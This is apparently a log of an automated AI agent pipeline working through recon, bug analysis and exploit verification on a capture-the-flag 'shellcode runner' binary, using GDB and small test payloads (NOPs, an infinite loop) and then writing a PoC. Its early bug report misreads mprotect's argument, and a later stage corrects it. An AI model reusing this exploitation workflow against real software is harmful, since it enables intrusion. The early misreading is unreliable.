14:40:45 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

14:40:45 --- S1 Recon ---
14:40:45 === recon (bug_id=-) ===
14:40:45 [recon] → 调用 GLM...
14:40:50 [recon] ← GLM(5.3s): 调工具[checksec, elf_info, identify_libc, sections, list_strings]
14:40:50 [recon] 我将开始对目标二进制进行系统性侦察。先并行收集基础信息。
14:40:50 [recon]   → 工具 checksec({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:40:50 [recon]   → 工具 elf_info({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:40:50 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:40:50 [recon]   → 工具 sections({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:40:50 [recon]   → 工具 list_strings({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "max_lines": 200})
14:40:50 [recon]   ← sections(0.0s): There are 31 section headers, starting at offset 0x38d8: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎ ...(4808 chars)
14:40:50 [recon]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ mfUa ⏎ __cxa_finalize ⏎ read ⏎ alarm ⏎ mprotect ⏎ __libc_start_main ⏎ memset ⏎ setvbuf ⏎ stdout ⏎ stdin ⏎ stderr ⏎ exit ...(1591 chars)
14:40:50 [recon]   ← elf_info(0.0s): /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, i...(4227 chars)
14:40:50 [recon]   ← identify_libc(0.0s): 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007dcb2d9c4000) ⏎ ===LIBC VERSION=== ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release ...(166 chars)
14:40:51 [recon]   ← checksec(0.1s): [*] '/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Full RELRO ⏎     Stac...(305 chars)
14:40:51 [recon] → 调用 GLM...
14:40:59 [recon] ← GLM(8.5s): 调工具[symbols, global_vars, got_plt, disassemble, cfg]
14:40:59 [recon] 这是一个 shellcode runner 程序。关键信息已浮现：mmap、mprotect、read shellcode、blacklist。现在并行收集符号、全局变量、GOT/PLT、反汇编、CFG。
14:40:59 [recon]   → 工具 symbols({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "max_lines": 100})
14:40:59 [recon]   → 工具 global_vars({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "max_lines": 60})
14:40:59 [recon]   → 工具 got_plt({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:40:59 [recon]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "main", "lines": 200})
14:40:59 [recon]   → 工具 cfg({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:40:59 [recon]   ← global_vars(0.0s):     14: 0000000000004020     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (3) ⏎     16: 0000000000004030     8 OBJECT  GLOBAL DEFAULT   26 stdin@G...(1277 chars)
14:40:59 [recon]   ← got_plt(0.0s): [{"offset": "0000000000003d78", "type": "R_X86_64_RELATIVE", "value": "*ABS*+0x0000000000001240"}, {"offset": "0000000000003d80", "type": "R_X86_64_RE...(1903 chars)
14:40:59 [recon]   ← symbols(0.0s): 0000000000003d88 d _DYNAMIC ⏎ 0000000000003f78 d _GLOBAL_OFFSET_TABLE_ ⏎ 0000000000002000 R _IO_stdin_used ⏎                  w _ITM_deregisterTMClone...(1644 chars)
14:40:59 [recon]   ← disassemble(0.0s): 000000000000132e <main>: ⏎     132e:	endbr64 ⏎     1332:	push   rbp ⏎     1333:	mov    rbp,rsp ⏎     1336:	sub    rsp,0x20 ⏎     133a:	mov    rax,QWOR...(3281 chars)
14:41:00 [recon]   ← cfg(0.6s): [{"name": "_init", "addr": "0x401000", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_401020", "addr": "0x401020", "blocks": 1, "cal...(4946 chars)
14:41:00 [recon] → 调用 GLM...
14:41:06 [recon] ← GLM(6.2s): 调工具[disassemble, disassemble, disassemble, probe_io, execute]
14:41:06 [recon] 核心逻辑已清晰。现在反汇编 blacklist、init、_abort 函数，并探测 I/O 行为，同时检查依赖解析链（RPATH/RUNPATH）。
14:41:06 [recon]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "blacklist", "lines": 120})
14:41:06 [recon]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "init", "lines": 80})
14:41:06 [recon]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "_abort", "lines": 40})
14:41:06 [recon]   → 工具 probe_io({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "input": "AAAAAAAAAAAAAAAA", "max_lines": 40})
14:41:06 [recon]   → 工具 execute({"command": "cd /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045 && readelf -d target | grep -iE 'path|needed|rpath|runpath' ; echo '--)
14:41:06 [recon]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(231 chars)
14:41:06 [recon]   ← disassemble(0.0s): 00000000000012ed <blacklist>: ⏎     12ed:	endbr64 ⏎     12f1:	push   rbp ⏎     12f2:	mov    rbp,rsp ⏎     12f5:	mov    QWORD PTR [rbp-0x18],rdi ⏎     ...(741 chars)
14:41:06 [recon]   ← disassemble(0.0s): 000000000000127e <init>: ⏎     127e:	endbr64 ⏎     1282:	push   rbp ⏎     1283:	mov    rbp,rsp ⏎     1286:	mov    rax,QWORD PTR [rip+0x2da3]        # ...(899 chars)
14:41:06 [recon]   ← disassemble(0.0s): 0000000000001249 <_abort>: ⏎     1249:	endbr64 ⏎     124d:	push   rbp ⏎     124e:	mov    rbp,rsp ⏎     1251:	sub    rsp,0x10 ⏎     1255:	mov    QWORD ...(466 chars)
14:41:06 [recon]   ← execute(0.0s):  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6] ⏎ ---LDD--- ⏎ 	linux-vdso.so.1 (0x00007c1398677000) ⏎ 	libc.so.6 => /lib/x86_64-l...(526 chars)
14:41:06 [recon] → 调用 GLM...
14:41:12 [recon] ← GLM(6.1s): 调工具[execute, execute]
14:41:12 [recon] 所有关键事实已收集完毕。blacklist 函数检查字节 0x0f（即 `syscall` 指令 `0f 05` 的第一个字节）。让我确认 rodata 中的字符串内容，并查看 full_run.log 是否有额外信息。
14:41:12 [recon]   → 工具 execute({"command": "cd /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045 && xxd -s 0x2000 -l 0x5b target ; echo '---FULLRUN---' ; head -50 full)
14:41:12 [recon]   → 工具 execute({"command": "cd /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045 && readelf -n target | head -30 ; echo '---GNU_PROPERTY---' ; readelf )
14:41:12 [recon]   ← execute(0.0s):  ⏎ Displaying notes found in: .note.gnu.property ⏎   Owner                Data size 	Description ⏎   GNU                  0x00000020	NT_GNU_PROPERTY_T...(1388 chars)
14:41:12 [recon]   ← execute(0.0s): 00002000: 0100 0200 0000 0000 2573 006d 6d61 7020  ........%s.mmap  ⏎ 00002010: 6661 696c 6564 210a 0000 0000 0000 0000  failed!......... ⏎ 00002020: ...(7236 chars)
14:41:12 [recon] → 调用 GLM...
14:42:36 [recon] ← GLM(83.8s): 调工具[submit_final_result]
14:42:36 [recon] 所有侦察事实已收集完毕。现在整理并提交结构化报告。  关键发现总结： - **shellcode runner**：mmap RWX 区(0x13370000, 0x64字节) → read 0x63 字节 shellcode → blacklist 检查 → mprotect 改为 R-X → 清
14:42:36 [recon] → 调用 GLM...
14:43:37 [recon] ← GLM(60.6s): 调工具[submit_final_result]
14:43:37 [recon] JSON 中有未转义的问题。让我修正后重新提交。
14:43:37 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，16384 chars）
14:43:37 [recon] → 调用 GLM...
14:43:45 [recon] ← GLM(8.0s)
14:43:45 [recon] S1 侦察报告已成功提交。以下是关键发现摘要：  ## 侦察结果摘要  **二进制**：`shellcode_runner3.c` 编译的 64 位 PIE 可执行文件，GCC 11.4.0，未 strip。  **保护机制**：Full RELRO + NX + Canary + PIE + CE
14:43:45 [stage1] 保存 → /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/stage1.json
14:43:45 --- S2 Semantic ---
14:43:45 === semantic (bug_id=-) ===
14:43:45 [semantic] → 调用 GLM...
14:43:51 [semantic] ← GLM(6.0s): 调工具[disassemble, disassemble]
14:43:51 [semantic] 我将分析这个 shellcode runner 二进制文件。让我先从检查关键函数的反汇编开始，以验证 S1 的事实并追踪数据流。
14:43:51 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "main", "lines": 200})
14:43:51 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "blacklist", "lines": 100})
14:43:51 [semantic]   ← disassemble(0.0s): 00000000000012ed <blacklist>: ⏎     12ed:	endbr64 ⏎     12f1:	push   rbp ⏎     12f2:	mov    rbp,rsp ⏎     12f5:	mov    QWORD PTR [rbp-0x18],rdi ⏎     ...(741 chars)
14:43:51 [semantic]   ← disassemble(0.0s): 000000000000132e <main>: ⏎     132e:	endbr64 ⏎     1332:	push   rbp ⏎     1333:	mov    rbp,rsp ⏎     1336:	sub    rsp,0x20 ⏎     133a:	mov    rax,QWOR...(3281 chars)
14:43:51 [semantic] → 调用 GLM...
14:43:54 [semantic] ← GLM(3.0s): 调工具[disassemble, disassemble]
14:43:54 [semantic] 现在让我验证 `init` 和 `_abort` 函数，并检查 `mprotect` 的返回值处理：
14:43:54 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "init", "lines": 50})
14:43:54 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "_abort", "lines": 50})
14:43:54 [semantic]   ← disassemble(0.0s): 0000000000001249 <_abort>: ⏎     1249:	endbr64 ⏎     124d:	push   rbp ⏎     124e:	mov    rbp,rsp ⏎     1251:	sub    rsp,0x10 ⏎     1255:	mov    QWORD ...(466 chars)
14:43:54 [semantic]   ← disassemble(0.0s): 000000000000127e <init>: ⏎     127e:	endbr64 ⏎     1282:	push   rbp ⏎     1283:	mov    rbp,rsp ⏎     1286:	mov    rax,QWORD PTR [rip+0x2da3]        # ...(899 chars)
14:43:54 [semantic] → 调用 GLM...
14:43:57 [semantic] ← GLM(3.1s): 调工具[list_strings]
14:43:57 [semantic] 现在让我检查一下 rodata 中的字符串，以确认提示字符串和格式字符串：
14:43:57 [semantic]   → 工具 list_strings({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "max_lines": 30})
14:43:57 [semantic]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ mfUa ⏎ __cxa_finalize ⏎ read ⏎ alarm ⏎ mprotect ⏎ __libc_start_main ⏎ memset ⏎ setvbuf ⏎ stdout ⏎ stdin ⏎ stderr ⏎ exit ...(451 chars)
14:43:57 [semantic] → 调用 GLM...
14:44:02 [semantic] ← GLM(4.9s): 调工具[read_file, execute]
14:44:02 [semantic] 现在让我来验证一个关键细节——`mprotect` 的返回值是否被检查了？让我更仔细地查看 0x1418-0x149a 附近的反汇编代码。我已经有了。让我再检查一下 CET 属性：
14:44:02 [semantic]   → 工具 read_file({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "limit": 5, "offset": 0})
14:44:02 [semantic]   → 工具 execute({"command": "readelf -n /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target 2>/dev/null | head -30"})
14:44:02 [semantic]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target': 'utf-8' codec can't decode byte 0xd8 in position 4...(178 chars)
14:44:02 [semantic]   ← execute(0.0s):  ⏎ Displaying notes found in: .note.gnu.property ⏎   Owner                Data size 	Description ⏎   GNU                  0x00000020	NT_GNU_PROPERTY_T...(703 chars)
14:44:02 [semantic] → 调用 GLM...
14:45:28 [semantic] ← GLM(86.5s): 调工具[submit_final_result]
14:45:28 [semantic] 现在我已经掌握了所有事实。让我来综合分析一下：  **关键发现：**  1. **`mprotect(buf, 0x64, 4)` — PROT_READ only**：在 0x141c 处，`mprotect` 被调用时 `edx=0x4` (PROT_READ)。这移除了 W 和 X 权限。随后
14:45:28 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，16718 chars）
14:45:28 [semantic] → 调用 GLM...
14:45:39 [semantic] ← GLM(11.1s)
14:45:39 [semantic] S2 语义漏洞分析已完成。我识别出了三个漏洞：  **BUG-001 (高危): MPROTECT_PERMISSION_LOGIC_FLAW** — `mprotect(buf, 0x64, 4)` 使用了 PROT_READ (4) 而非 PROT_READ|PROT_EXEC (5)，导致 s
14:45:39 [stage2] 保存 → /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/stage2.json
14:45:39 --- S3 Primitive（所有 bug） ---
14:45:39 === impact (bug_id=BUG-001) ===
14:45:39 [impact:BUG-001] → 调用 GLM...
14:45:43 [impact:BUG-001] ← GLM(3.7s): 调工具[disassemble, checksec]
14:45:43 [impact:BUG-001] 我将分析 BUG-001 (MPROTECT_PERMISSION_LOGIC_FLAW) 以推导并验证其原语。让我先检查二进制文件并理解确切的机制。
14:45:43 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "function": "main", "lines": 200})
14:45:43 [impact:BUG-001]   → 工具 checksec({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target"})
14:45:43 [impact:BUG-001]   ← disassemble(0.0s): 000000000000132e <main>: ⏎     132e:	endbr64 ⏎     1332:	push   rbp ⏎     1333:	mov    rbp,rsp ⏎     1336:	sub    rsp,0x20 ⏎     133a:	mov    rax,QWOR...(3281 chars)
14:45:43 [impact:BUG-001]   ← checksec(0.1s): [*] '/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Full RELRO ⏎     Stac...(305 chars)
14:45:43 [impact:BUG-001] → 调用 GLM...
14:45:48 [impact:BUG-001] ← GLM(4.4s): 调工具[probe_io]
14:45:48 [impact:BUG-001] 很好。反汇编确认了 BUG-001：在 0x141c 处，`mov edx, 0x4` (PROT_READ) 而不是 0x5 (PROT_READ|PROT_EXEC)。在 0x149a 处的 `jmp rdi` 跳转到 0x13370000，此时该地址已变为不可执行。  现在让我验证一下运行时行
14:45:48 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "input": "AAAA"})
14:45:48 [impact:BUG-001]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(231 chars)
14:45:48 [impact:BUG-001] → 调用 GLM...
14:45:52 [impact:BUG-001] ← GLM(4.4s): 调工具[gdb_run_crash]
14:45:52 [impact:BUG-001] 确认：程序提示输入，接受 "AAAA"（没有 0x0f 字节，通过了黑名单），然后发生段错误（SIGSEGV）。现在让我通过 GDB 获取详细的崩溃信息，以验证崩溃是否发生在 0x13370000（不可执行页面），并捕获确切的信号和寄存器状态。
14:45:52 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "payload_file": "/dev/null"})
14:45:52 [impact:BUG-001]   ← gdb_run_crash(0.1s): {"raw_tail": "[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nInput you...(308 chars)
14:45:52 [impact:BUG-001] → 调用 GLM...
14:45:57 [impact:BUG-001] ← GLM(4.6s): 调工具[make_payload]
14:45:57 [impact:BUG-001] `/dev/null` 会导致 `read` 返回 0，从而在到达 `jmp` 之前触发 "read failed!"。我需要一个包含有效（无 0x0f）shellcode 字节的 payload 文件。让我创建一个并运行 GDB 来捕获崩溃。
14:45:57 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload_crash.bin", "parts": [["AAAA", 1]]})
14:45:57 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload_crash.bin len=4 preview_hex=41414141
14:45:57 [impact:BUG-001] → 调用 GLM...
14:46:01 [impact:BUG-001] ← GLM(4.4s): 调工具[gdb_run_crash]
14:46:01 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "payload_file": "/work/workspace/0026-2024-49-shellcode-runner-3-)
14:46:01 [impact:BUG-001]   ← gdb_run_crash(0.1s): {"signal": "SIGSEGV", "crash_addr": "0x0000000013370000", "crash_loc": "Segmentation fault.", "raw_tail": "       0\nfs             0x0               ...(419 chars)
14:46:01 [impact:BUG-001] → 调用 GLM...
14:46:08 [impact:BUG-001] ← GLM(7.1s): 调工具[gdb_run]
14:46:08 [impact:BUG-001] 太棒了！GDB 证实了： - **Signal: SIGSEGV** - **Crash address: 0x0000000013370000** — 正是 `jmp rdi` 的目标地址 - **RIP = 0x13370000** — CPU 试图从该地址执行指令 - 崩溃发生在不可执行页面（
14:46:08 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xcb; run < /work/workspace/0026-2024-49-she)
14:46:08 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x13f9 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(542 chars)
14:46:08 [impact:BUG-001] → 调用 GLM...
14:46:14 [impact:BUG-001] ← GLM(5.5s): 调工具[gdb_run]
14:46:14 [impact:BUG-001] GDB 确认： - 在 `jmp rdi` (0x149a) 处，`rdi = 0x13370000`，且缓冲区包含我们的 "AAAA" (0x41414141) - `rip` 位于 `main+0x16c` (0x149a)，即 `jmp rdi` 指令 - 缓冲区内容存在且可读 (0x4141
14:46:14 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xcb; run < /work/workspace/0026-2024-49-she)
14:46:14 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x13f9 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(286 chars)
14:46:14 [impact:BUG-001] → 调用 GLM...
14:46:18 [impact:BUG-001] ← GLM(4.1s): 调工具[gdb_run]
14:46:18 [impact:BUG-001] 这显示了 `mprotect` 之前的映射：`rwxp` (RWX)。现在让我在 `mprotect` 调用之后检查它，以确认它已变为 `r--p` (PROT_READ)。
14:46:18 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:46:18 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(333 chars)
14:46:18 [impact:BUG-001] → 调用 GLM...
14:46:24 [impact:BUG-001] ← GLM(6.0s): 调工具[gdb_run]
14:46:24 [impact:BUG-001] 有趣！在 `mprotect` 之后，映射显示为 `--xp`（仅可执行，不可读/不可写）。这与 `PROT_READ=4` 不同。让我重新检查一下——`mprotect(buf, 0x64, 4)` 且 `PROT_READ=4` 应该得到 `r--p`。但 `/proc/maps` 显示的是 `
14:46:24 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xcb; run < /work/workspace/0026-2024-49-she)
14:46:24 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x13f9 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(418 chars)
14:46:24 [impact:BUG-001] → 调用 GLM...
14:46:37 [impact:BUG-001] ← GLM(13.3s): 调工具[gdb_run]
14:46:37 [impact:BUG-001] 关键发现： 1. **`mprotect` 返回 0**（成功）—— `$1 = 0x0` 2. 在 `mprotect(buf, 0x64, 4)` 之后，`/proc/maps` 显示 `13370000-13371000 --xp` —— 该页面是**仅可执行**（`--xp`），而不是 `r
14:46:37 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:46:38 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(417 chars)
14:46:38 [impact:BUG-001] → 调用 GLM...
14:46:46 [impact:BUG-001] ← GLM(8.2s): 调工具[gdb_run]
14:46:46 [impact:BUG-001] 重要发现： 1. CPU 支持 `ibt` (Indirect Branch Tracking) —— 已在 /proc/cpuinfo 中确认 2. 在 `mprotect(buf, 0x64, 4)` 之后，页面为 `--xp` (仅执行，PROT_EXEC=4) 3. `RIP` 到达 `0x
14:46:46 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:46:46 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(562 chars)
14:46:46 [impact:BUG-001] → 调用 GLM...
14:46:54 [impact:BUG-001] ← GLM(8.4s): 调工具[gdb_run]
14:46:54 [impact:BUG-001] 现在我已经掌握了全貌。让我来验证一个关键问题：崩溃是因为 IBT（目标处没有 `endbr64`）还是因为页面不可读？让我测试一下在 shellcode 开头加上 `endbr64` 是否能避免崩溃。但 `endbr64` 是 `f3 0f 1e fa`，其中包含 `0x0f`，这是被列入黑名单的。
14:46:54 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "handle SIGSEGV stop; b *main+0x16c; run < /work/work)
14:46:54 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(952 chars)
14:46:54 [impact:BUG-001] → 调用 GLM...
14:47:07 [impact:BUG-001] ← GLM(12.9s)
14:47:07 [impact:BUG-001] 关键发现： - `si_signo = 11` (SIGSEGV) - `si_code = 1` (SEGV_MAPERR = 1，意味着地址未映射/不可访问) - `si_addr = 0x0` (故障地址为 0，而不是 0x13370000)  `si_code = 1` (SEGV_MAPE
14:47:07 [retry] 无 submit（1/5），原地重试...
14:47:07 [impact:BUG-001] → 调用 GLM...
14:47:11 [impact:BUG-001] ← GLM(3.6s): 调工具[make_payload]
14:47:11 [impact:BUG-001] 我需要继续分析。关键发现是 `mprotect(buf, 0x64, 4)` 中 4=PROT_EXEC（而不是 S2 声称的 PROT_READ），并且 shellcode 确实执行了！崩溃发生在 si_addr=0x0，原因是寄存器被清零，而不是因为 NX 违规。让我通过发送能够处理清零寄存器的
14:47:11 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload_nop.bin", "parts": [["\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\)
14:47:11 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload_nop.bin len=10 preview_hex=90909090909090909090
14:47:11 [impact:BUG-001] → 调用 GLM...
14:47:14 [impact:BUG-001] ← GLM(3.0s): 调工具[gdb_run]
14:47:14 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:47:14 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1009 chars)
14:47:14 [impact:BUG-001] → 调用 GLM...
14:47:22 [impact:BUG-001] ← GLM(8.4s): 调工具[make_payload]
14:47:22 [impact:BUG-001] 这**确凿地证明了 shellcode 确实在执行**： - 我发送了 10 个 NOP (0x90) 字节 - RIP 从 0x13370000 前进到了 **0x1337000a** —— 正好前进了 10 个字节（NOP 指令的数量！） - CPU 执行了所有 10 个 NOP，然后撞上了 m
14:47:22 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload_loop.bin", "parts": [["\\xeb\\xfe", 1]]})
14:47:22 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/payload_loop.bin len=2 preview_hex=ebfe
14:47:22 [impact:BUG-001] → 调用 GLM...
14:47:27 [impact:BUG-001] ← GLM(4.6s): 调工具[gdb_run]
14:47:27 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:47:32 [impact:BUG-001]   ← gdb_run(5.0s): gdb timed out (5s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
14:47:32 [impact:BUG-001] → 调用 GLM...
14:47:37 [impact:BUG-001] ← GLM(4.9s): 调工具[gdb_run]
14:47:37 [impact:BUG-001] 超时是预料之中的——`0xeb 0xfe` 是一个无限循环（`jmp $-2`），所以程序永远不会崩溃。这**证明了 shellcode 执行了**——CPU 进入了无限循环而不是崩溃，确认了任意代码执行。让我用一个更短的 gdb 超时来验证一下，以确认 RIP 停留在 0x13370000。
14:47:37 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:47:45 [impact:BUG-001]   ← gdb_run(8.0s): gdb timed out (8s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
14:47:45 [impact:BUG-001] → 调用 GLM...
14:47:51 [impact:BUG-001] ← GLM(6.3s): 调工具[gdb_run]
14:47:51 [impact:BUG-001] 无限循环导致 gdb 挂起。这没关系——超时本身就是 shellcode 正在执行（陷入无限循环）的证据。NOP 测试已经证明了执行。现在让我编写验证 PoC 脚本并记录所有证据。  让我再验证一个关键点：页面是 `--xp`（仅可执行，不可读）。这意味着 shellcode 无法读取自身的数据。让
14:47:51 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run < /work/workspace/0026-2024-49-sh)
14:47:51 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(530 chars)
14:47:51 [impact:BUG-001] → 调用 GLM...
14:48:28 [impact:BUG-001] ← GLM(36.6s): 调工具[write_file]
14:48:28 [impact:BUG-001] GDB 可以读取该页面（因为 GDB 通过 `/proc/pid/mem` 进行访问，绕过了内存保护）。该页面是 `--xp`（仅可执行）。缓冲区包含 10 个 NOP，后跟零。  现在我已经掌握了所有证据。让我编写验证 PoC 脚本。
14:48:28 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS3 Primitive Verification PoC for BUG-001: MPROTECT_PERMISSION_LOGIC_FLAW\n\nBUG-001: main calls mprotect)
14:48:28 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-001.py
14:48:28 [impact:BUG-001] → 调用 GLM...
14:48:31 [impact:BUG-001] ← GLM(3.7s): 调工具[run_script]
14:48:31 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-001.py", "timeout": 30})
